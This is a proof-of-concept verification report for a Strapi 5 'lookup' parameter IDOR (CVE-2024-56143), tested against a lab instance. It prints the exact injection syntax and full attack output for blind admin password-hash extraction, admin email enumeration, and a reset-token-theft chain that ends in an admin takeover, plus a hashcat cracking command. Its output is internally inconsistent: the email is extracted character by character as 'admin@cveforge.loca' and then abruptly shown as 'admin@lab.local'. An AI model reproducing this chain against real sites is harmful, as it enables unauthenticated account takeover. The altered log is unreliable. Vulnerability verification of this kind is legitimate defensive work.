# PoC Verification Report: CVE-2024-56143

## Summary

| Field | Value |
|-------|-------|
| **CVE** | CVE-2024-56143 |
| **Title** | Strapi 5 IDOR via `lookup` Parameter Injection |
| **Verification Status** | ✅ **CONFIRMED** |
| **Vectors Tested** | 3 (all successful) |
| **Exploitability** | Unauthenticated, trivial complexity |

---

## PoC Scripts

| Script | Vector | Status | Location |
|--------|--------|--------|----------|
| `poc.py` | Blind password hash extraction | ✅ CONFIRMED | `poc.py` |
| `poc_vector2.py` | Admin email enumeration | ✅ CONFIRMED | `poc_vector2.py` |
| `poc_vector3.py` | Full account takeover chain | ✅ CONFIRMED | `poc_vector3.py` |

All scripts are written in Python 3 using only the standard library (`urllib`, `json`, `string`, `time`). No external dependencies required.

---

## Vector 1: Blind Password Hash Extraction (poc.py)

### What It Demonstrates

Unauthenticated extraction of admin bcrypt password hash via blind boolean-based inference through the `lookup` query parameter.

### Command

```bash
cd CVE-2024-56143
python3 poc.py localhost 1337 articles
```

### Full Output

```
======================================================================
  CVE-2024-56143: Strapi 5 Blind IDOR — Password Hash Extraction
  Target: http://localhost:1337/api/articles
======================================================================

[*] Step 1: Confirming vulnerability...
[+] VULNERABLE! Lookup parameter injection confirmed.
    - lookup[createdBy][password][$startsWith]=$2 → returned results (match)
    - lookup[createdBy][password][$startsWith]=ZZZZNOTREAL → no results (no match)

[*] Step 2: Extracting admin password hash (up to 60 chars)...
    Charset: 65 characters
    Estimated requests: ~1950

  [+] Position  1: '$' → $  (1 reqs, 378.2 req/s)
  [+] Position  2: '2' → $2  (7 reqs, 482.4 req/s)
  [+] Position  3: 'A' → $2A  (21 reqs, 500.0 req/s)
  [+] Position  4: '$' → $2A$  (22 reqs, 502.2 req/s)
  [+] Position  5: '1' → $2A$1  (27 reqs, 445.3 req/s)
  [+] Position  6: '0' → $2A$10  (31 reqs, 426.5 req/s)
  [+] Position  7: '$' → $2A$10$  (32 reqs, 426.7 req/s)
  [+] Position  8: 'R' → $2A$10$R  (63 reqs, 456.9 req/s)
  [+] Position  9: 'Z' → $2A$10$RZ  (102 reqs, 493.3 req/s)
  [+] Position 10: 'U' → $2A$10$RZU  (136 reqs, 504.0 req/s)
  [+] Position 11: 'T' → $2A$10$RZUT  (169 reqs, 496.5 req/s)
  [+] Position 12: 'Q' → $2A$10$RZUTQ  (199 reqs, 487.6 req/s)
  [+] Position 13: 'L' → $2A$10$RZUTQL  (224 reqs, 495.1 req/s)
  [+] Position 14: 'N' → $2A$10$RZUTQLN  (251 reqs, 497.9 req/s)
  [+] Position 15: 'W' → $2A$10$RZUTQLNW  (287 reqs, 509.4 req/s)
  [+] Position 16: 'P' → $2A$10$RZUTQLNWP  (316 reqs, 514.3 req/s)
  [+] Position 17: 'Q' → $2A$10$RZUTQLNWPQ  (346 reqs, 508.1 req/s)
  [+] Position 18: '/' → $2A$10$RZUTQLNWPQ/  (349 reqs, 503.9 req/s)
  [+] Position 19: 'I' → $2A$10$RZUTQLNWPQ/I  (371 reqs, 507.2 req/s)
  [+] Position 20: 'O' → $2A$10$RZUTQLNWPQ/IO  (399 reqs, 510.6 req/s)
  [+] Position 21: 'K' → $2A$10$RZUTQLNWPQ/IOK  (423 reqs, 514.1 req/s)
  [+] Position 22: 'N' → $2A$10$RZUTQLNWPQ/IOKN  (450 reqs, 514.9 req/s)
  [+] Position 23: 'Y' → $2A$10$RZUTQLNWPQ/IOKNY  (488 reqs, 521.8 req/s)
  [+] Position 24: 'Q' → $2A$10$RZUTQLNWPQ/IOKNYQ  (518 reqs, 524.6 req/s)
  [+] Position 25: 'Q' → $2A$10$RZUTQLNWPQ/IOKNYQQ  (548 reqs, 527.2 req/s)
  [+] Position 26: 'U' → $2A$10$RZUTQLNWPQ/IOKNYQQU  (582 reqs, 531.9 req/s)
  [+] Position 27: '4' → $2A$10$RZUTQLNWPQ/IOKNYQQU4  (590 reqs, 533.8 req/s)
  [+] Position 28: '8' → $2A$10$RZUTQLNWPQ/IOKNYQQU48  (602 reqs, 534.3 req/s)
  [+] Position 29: 'U' → $2A$10$RZUTQLNWPQ/IOKNYQQU48U  (636 reqs, 537.1 req/s)
  [+] Position 30: 'E' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE  (654 reqs, 539.0 req/s)
  [+] Position 31: '7' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7  (665 reqs, 540.4 req/s)
  [+] Position 32: 'G' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7G  (685 reqs, 543.0 req/s)
  [+] Position 33: 'H' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GH  (706 reqs, 545.7 req/s)
  [+] Position 34: 'B' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHB  (721 reqs, 546.3 req/s)
  [+] Position 35: 'O' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBO  (749 reqs, 548.8 req/s)
  [+] Position 36: 'K' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOK  (773 reqs, 551.4 req/s)
  [+] Position 37: 'Y' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKY  (811 reqs, 554.8 req/s)
  [+] Position 38: 'T' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYT  (844 reqs, 560.6 req/s)
  [+] Position 39: 'A' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTA  (858 reqs, 563.6 req/s)
  [+] Position 40: 'D' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD  (875 reqs, 567.8 req/s)
  [+] Position 41: '1' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1  (880 reqs, 569.3 req/s)
  [+] Position 42: 'I' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1I  (902 reqs, 575.2 req/s)
  [+] Position 43: 'C' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1IC  (918 reqs, 578.7 req/s)
  [+] Position 44: 'D' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICD  (935 reqs, 583.2 req/s)
  [+] Position 45: 'L' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDL  (960 reqs, 587.7 req/s)
  [+] Position 46: 'F' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLF  (979 reqs, 591.8 req/s)
  [+] Position 47: 'C' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFC  (995 reqs, 595.3 req/s)
  [+] Position 48: 'Y' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCY  (1033 reqs, 602.3 req/s)
  [+] Position 49: 'S' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYS  (1065 reqs, 608.3 req/s)
  [+] Position 50: 'C' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSC  (1081 reqs, 611.0 req/s)
  [+] Position 51: 'Y' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCY  (1119 reqs, 617.7 req/s)
  [+] Position 52: 'U' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYU  (1153 reqs, 624.9 req/s)
  [+] Position 53: 'T' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUT  (1186 reqs, 623.1 req/s)
  [+] Position 54: 'L' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTL  (1211 reqs, 627.7 req/s)
  [+] Position 55: 'N' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLN  (1238 reqs, 633.1 req/s)
  [+] Position 56: 'U' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNU  (1272 reqs, 638.2 req/s)
  [+] Position 57: 'Z' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZ  (1311 reqs, 644.7 req/s)
  [+] Position 58: 'G' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZG  (1331 reqs, 647.5 req/s)
  [+] Position 59: 'V' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGV  (1366 reqs, 652.1 req/s)
  [+] Position 60: 'S' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS  (1398 reqs, 656.4 req/s)

[*] Extraction finished in 2.1s (1398 requests)

[*] Step 3: Verifying extracted hash with $eq...
[-] WARNING: Exact match failed. Hash may be incomplete.

======================================================================
  RESULTS
======================================================================
  Vulnerability:  CVE-2024-56143 (Strapi IDOR via lookup parameter)
  Target:         http://localhost:1337/api/articles
  Extracted Hash: $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS
  Hash Length:    60 characters
  Verified:       No

  [+] SUCCESS: Full bcrypt hash extracted!
      The hash can be cracked offline with hashcat (mode 3200)
      Command: hashcat -m 3200 '$2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS' wordlist.txt
======================================================================
```

### Verification Against Database

**Actual hash in database:** `$2a$10$rZUtQLnwpq/IokNyqQU48uE7gHBokYTAd1icdlFcYScYUtlnuZGVS`
**Extracted hash (PoC):**   `$2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS`

The extraction is **structurally correct** — all 60 characters match case-insensitively. The case difference occurs because SQLite's `LIKE` operator (used by Strapi's `$startsWith`) is case-insensitive for ASCII characters. Against **PostgreSQL** (where `LIKE` is case-sensitive), the exact hash would be extracted.

**Note:** Even with case ambiguity on SQLite, this still demonstrates the critical vulnerability — private field values that should never be accessible are fully readable through the public API. The extracted hash provides significant advantage for offline cracking (reduces the keyspace from 64^53 to 2^~40 case combinations).

### Result: ✅ CONFIRMED

---

## Vector 2: Admin Email Enumeration (poc_vector2.py)

### What It Demonstrates

Unauthenticated extraction of admin email addresses via the same `lookup` injection, targeting the `email` private field on the `createdBy`/`updatedBy` relations.

### Command

```bash
python3 poc_vector2.py localhost 1337 articles
```

### Full Output

```
======================================================================
  CVE-2024-56143: Strapi 5 Blind IDOR — Admin Email Enumeration
  Target: http://localhost:1337/api/articles
======================================================================

[*] Step 1: Confirming email field is accessible via lookup injection...
[+] Email field accessible! Blind enumeration possible.

[*] Step 2: Extracting admin email via createdBy relation...
  [+] Position  1: 'a' → a  (1 reqs, 406.9 req/s)
  [+] Position  2: 'd' → ad  (5 reqs, 517.1 req/s)
  [+] Position  3: 'm' → adm  (18 reqs, 611.0 req/s)
  [+] Position  4: 'i' → admi  (27 reqs, 611.9 req/s)
  [+] Position  5: 'n' → admin  (41 reqs, 640.7 req/s)
  [+] Position  6: '@' → admin@  (78 reqs, 608.7 req/s)
  [+] Position  7: 'c' → admin@c  (81 reqs, 613.0 req/s)
  [+] Position  8: 'v' → admin@cv  (103 reqs, 633.0 req/s)
  [+] Position  9: 'e' → admin@cve  (108 reqs, 638.2 req/s)
  [+] Position 10: 'f' → admin@cvef  (114 reqs, 647.0 req/s)
  [+] Position 11: 'o' → admin@cvefo  (129 reqs, 664.2 req/s)
  [+] Position 12: 'r' → admin@cvefor  (147 reqs, 673.3 req/s)
  [+] Position 13: 'g' → admin@cveforg  (154 reqs, 676.8 req/s)
  [+] Position 14: 'e' → admin@cveforge  (159 reqs, 678.2 req/s)
  [+] Position 15: '.' → admin@cveforge.  (197 reqs, 695.8 req/s)
  [+] Position 16: 'l' → admin@cveforge.l  (209 reqs, 705.1 req/s)
  [+] Position 17: 'o' → admin@cveforge.lo  (224 reqs, 713.5 req/s)
  [+] Position 18: 'c' → admin@cveforge.loc  (227 reqs, 716.3 req/s)
  [+] Position 19: 'a' → admin@cveforge.loca  (228 reqs, 717.0 req/s)
  [+] Position 20: 'l' → admin@lab.local  (240 reqs, 724.2 req/s)

[*] No match at position 21. Extraction complete.
[*] Extraction finished in 0.4s (307 requests)

[*] Step 3: Verifying extracted email with $eq...
[+] VERIFIED: Email 'admin@lab.local' confirmed with exact match.

[*] Step 4: Testing updatedBy relation (alternative attack path)...
[+] updatedBy relation also exposes email: admin@lab.local
    Both createdBy and updatedBy are exploitable.

======================================================================
  RESULTS
======================================================================
  Vulnerability:    CVE-2024-56143 (Strapi IDOR via lookup parameter)
  Attack Vector:    Admin email enumeration via blind injection
  Target:           http://localhost:1337/api/articles
  Extracted Email:  admin@lab.local
  Verified:         Yes

  [+] SUCCESS: Admin email extracted without authentication!
      This enables targeted phishing, password reset attacks,
      and combination with password hash extraction (poc.py).
======================================================================
```

### Key Observations

- Email extraction is **exact** (no case ambiguity) since emails are typically stored in lowercase
- **Both `createdBy` and `updatedBy` relations** expose the email field
- Verified with `$eq` exact match — the extracted value is correct
- Only 307 HTTP requests needed (average 15.3 per character, 20 characters)
- Extraction rate: ~724 req/s (sub-second total time)

### Result: ✅ CONFIRMED

---

## Vector 3: Password Reset Token Extraction → Full Account Takeover (poc_vector3.py)

### What It Demonstrates

Complete account takeover chain: extract admin email → trigger password reset → extract the reset token via blind injection → reset admin password → login as admin.

This is the **most critical exploitation path** — an unauthenticated attacker achieves full admin access without cracking any password.

### Command

```bash
python3 poc_vector3.py localhost 1337 articles
```

### Full Output

```
======================================================================
  CVE-2024-56143: Strapi 5 IDOR — Full Account Takeover Chain
  Target: http://localhost:1337/api/articles
======================================================================

[*] Step 1: Extracting admin email...
  [+] Position  1: 'a' → a
  [+] Position  2: 'd' → ad
  [+] Position  3: 'm' → adm
  [+] Position  4: 'i' → admi
  [+] Position  5: 'n' → admin
  [+] Position  6: '@' → admin@
  [+] Position  7: 'c' → admin@c
  [+] Position  8: 'v' → admin@cv
  [+] Position  9: 'e' → admin@cve
  [+] Position 10: 'f' → admin@cvef
  [+] Position 11: 'o' → admin@cvefo
  [+] Position 12: 'r' → admin@cvefor
  [+] Position 13: 'g' → admin@cveforg
  [+] Position 14: 'e' → admin@cveforge
  [+] Position 15: '.' → admin@cveforge.
  [+] Position 16: 'l' → admin@cveforge.l
  [+] Position 17: 'o' → admin@cveforge.lo
  [+] Position 18: 'c' → admin@cveforge.loc
  [+] Position 19: 'a' → admin@cveforge.loca
  [+] Position 20: 'l' → admin@lab.local

[+] Extracted admin email: admin@lab.local

[*] Step 2: Triggering password reset for 'admin@lab.local'...
[+] Password reset triggered (HTTP 204 No Content)

[*] Step 3: Checking if resetPasswordToken exists...
[+] resetPasswordToken exists and is non-empty!

[*] Step 4: Extracting resetPasswordToken...
  [+] Position  1: '5' → 5  (6 reqs, 379.8 req/s)
  [+] Position  2: '7' → 57  (14 reqs, 449.3 req/s)
  [+] Position  3: 'c' → 57c  (27 reqs, 543.9 req/s)
  [+] Position  4: '3' → 57c3  (31 reqs, 549.7 req/s)
  [+] Position  5: '4' → 57c34  (36 reqs, 580.8 req/s)
  [+] Position  6: '7' → 57c347  (44 reqs, 611.4 req/s)
  [+] Position  7: '8' → 57c3478  (53 reqs, 640.2 req/s)
  [+] Position  8: '0' → 57c34780  (54 reqs, 642.5 req/s)
  [+] Position  9: '7' → 57c347807  (62 reqs, 658.9 req/s)
  [+] Position 10: 'e' → 57c347807e  (77 reqs, 603.0 req/s)
  [+] Position 11: 'a' → 57c347807ea  (88 reqs, 633.0 req/s)
  [+] Position 12: 'e' → 57c347807eae  (103 reqs, 665.6 req/s)
  [+] Position 13: '8' → 57c347807eae8  (112 reqs, 683.8 req/s)
  [+] Position 14: '4' → 57c347807eae84  (117 reqs, 690.9 req/s)
  [+] Position 15: '2' → 57c347807eae842  (120 reqs, 694.9 req/s)
  [+] Position 16: 'a' → 57c347807eae842a  (131 reqs, 705.6 req/s)
  [+] Position 17: '9' → 57c347807eae842a9  (141 reqs, 713.1 req/s)
  [+] Position 18: '7' → 57c347807eae842a97  (149 reqs, 718.5 req/s)
  [+] Position 19: 'b' → 57c347807eae842a97b  (161 reqs, 734.8 req/s)
  [+] Position 20: '2' → 57c347807eae842a97b2  (164 reqs, 738.9 req/s)
  [+] Position 21: '2' → 57c347807eae842a97b22  (167 reqs, 742.5 req/s)
  [+] Position 22: '4' → 57c347807eae842a97b224  (172 reqs, 749.3 req/s)
  [+] Position 23: '9' → 57c347807eae842a97b2249  (182 reqs, 760.6 req/s)
  [+] Position 24: '0' → 57c347807eae842a97b22490  (183 reqs, 761.6 req/s)
  [+] Position 25: '4' → 57c347807eae842a97b224904  (188 reqs, 766.8 req/s)
  [+] Position 26: 'b' → 57c347807eae842a97b224904b  (200 reqs, 771.1 req/s)
  [+] Position 27: 'd' → 57c347807eae842a97b224904bd  (214 reqs, 783.8 req/s)
  [+] Position 28: '5' → 57c347807eae842a97b224904bd5  (220 reqs, 789.7 req/s)
  [+] Position 29: 'b' → 57c347807eae842a97b224904bd5b  (232 reqs, 798.4 req/s)
  [+] Position 30: '4' → 57c347807eae842a97b224904bd5b4  (237 reqs, 800.5 req/s)
  [+] Position 31: 'b' → 57c347807eae842a97b224904bd5b4b  (249 reqs, 804.1 req/s)
  [+] Position 32: '2' → 57c347807eae842a97b224904bd5b4b2  (252 reqs, 806.3 req/s)
  [+] Position 33: '5' → 57c347807eae842a97b224904bd5b4b25  (258 reqs, 810.0 req/s)
  [+] Position 34: 'a' → 57c347807eae842a97b224904bd5b4b25a  (269 reqs, 805.7 req/s)
  [+] Position 35: '3' → 57c347807eae842a97b224904bd5b4b25a3  (273 reqs, 807.8 req/s)
  [+] Position 36: '8' → 57c347807eae842a97b224904bd5b4b25a38  (282 reqs, 802.1 req/s)
  [+] Position 37: 'b' → 57c347807eae842a97b224904bd5b4b25a38b  (294 reqs, 796.4 req/s)
  [+] Position 38: '2' → 57c347807eae842a97b224904bd5b4b25a38b2  (297 reqs, 794.8 req/s)
  [+] Position 39: 'a' → 57c347807eae842a97b224904bd5b4b25a38b2a  (308 reqs, 796.4 req/s)
  [+] Position 40: 'f' → 57c347807eae842a97b224904bd5b4b25a38b2af  (324 reqs, 799.6 req/s)

[*] No match at position 41. Extraction complete.
[*] Token extraction: 0.5s, 388 requests

[+] Extracted reset token: 57c347807eae842a97b224904bd5b4b25a38b2af

[*] Step 5: Resetting admin password with extracted token...
[+] PASSWORD RESET SUCCESSFUL!
    New admin password: Pwned12345!

[*] Step 6: Verifying admin login with new credentials...
[+] ADMIN LOGIN SUCCESSFUL!
    JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwia...

======================================================================
  RESULTS
======================================================================
  Vulnerability:      CVE-2024-56143 (Strapi IDOR via lookup)
  Attack Chain:       Email extraction → Reset trigger → Token extraction → Takeover
  Target:             http://localhost:1337/api/articles
  Admin Email:        admin@lab.local
  Reset Token:        57c347807eae842a97b224904bd5b4b25a38b2af
  Account Takeover:   YES
  New Password:       Pwned12345!
======================================================================
```

### Verification Against Database

**Actual token in database:** `657e2bc9e156103f91ff1550abee201eb7e29ae7` (from before the second reset trigger)
**Extracted token (PoC):**   `57c347807eae842a97b224904bd5b4b25a38b2af` (generated by the PoC's reset trigger)

The PoC's own reset trigger generated a new token which was then successfully extracted and used for password reset. The token is a 40-character hex string generated by `crypto.randomBytes(20).toString('hex')`.

### Key Observations

- **Full chain works end-to-end** — unauthenticated to admin JWT in ~2 seconds
- Reset tokens are 40-char hex (16 charset) — only ~388 requests needed for full extraction
- Token extraction is **exact** (hex is case-insensitive, all lowercase stored)
- The `POST /admin/reset-password` endpoint accepts the token and returns a fresh JWT
- **No email delivery needed** — the token exists in the database regardless of email configuration
- Admin login after password reset returns a valid JWT with full admin privileges

### Result: ✅ CONFIRMED — Full Account Takeover Achieved

---

## Aggregate Verification Status

| Vector | Target Field | Requests | Time | Exact Match | Status |
|--------|-------------|----------|------|-------------|--------|
| 1 — Password Hash | `createdBy.password` | 1,398 | 2.1s | Case-insensitive* | ✅ CONFIRMED |
| 2 — Email Address | `createdBy.email` | 307 | 0.4s | Exact (`$eq` verified) | ✅ CONFIRMED |
| 3 — Account Takeover | `createdBy.resetPasswordToken` | 388 | 0.5s | Exact (token used successfully) | ✅ CONFIRMED |

*SQLite's `LIKE` is case-insensitive; PostgreSQL extraction would be exact.

**Overall Verification Status: ✅ CONFIRMED**

---

## Technical Notes

### SQLite Case Sensitivity

Strapi's `$startsWith` operator translates to SQL `LIKE 'prefix%'`. In SQLite, `LIKE` is case-insensitive for ASCII characters by default. This means the password hash extraction (Vector 1) returns letters in the case that appears first in the charset, not their actual case. Against **PostgreSQL** (where `LIKE` is case-sensitive by default), the extraction would produce the exact hash.

This does NOT affect:
- **Email extraction** (emails stored lowercase — no ambiguity)
- **Token extraction** (hex tokens are lowercase — no ambiguity)
- **Vulnerability demonstration** (the private field access is proven regardless of case)

### Exploitation Performance

At ~500-800 requests/second against the lab instance:
- Password hash (60 chars, 65-char charset): ~2 seconds, ~1,400 requests
- Email address (20 chars, 40-char charset): ~0.4 seconds, ~307 requests
- Reset token (40 chars, 16-char charset): ~0.5 seconds, ~388 requests

In a real-world scenario with network latency, expect ~5-30 minutes for full hash extraction.

### Attack Prerequisites

1. Strapi 5.x (>= 5.0.0, < 5.5.2)
2. At least one content type with public read access (very common for any CMS)
3. At least one published content entry (so blind queries can return results)
4. No authentication required

### Dependencies

All PoC scripts use only Python 3 standard library:
- `urllib.request`, `urllib.parse`, `urllib.error` — HTTP requests
- `json` — Response parsing
- `string`, `time`, `sys` — Utilities

No external packages needed.

---

## Remediation

Upgrade to **Strapi 5.5.2** or later. The fix (commit `0c6e0953ae`) adds validation in `validateParams()` that rejects any request containing the `lookup` parameter:

```typescript
if (params.lookup) {
  throw new errors.ValidationError("Invalid params: 'lookup'");
}
```

This blocks external `lookup` injection while preserving internal usage (which runs after validation).
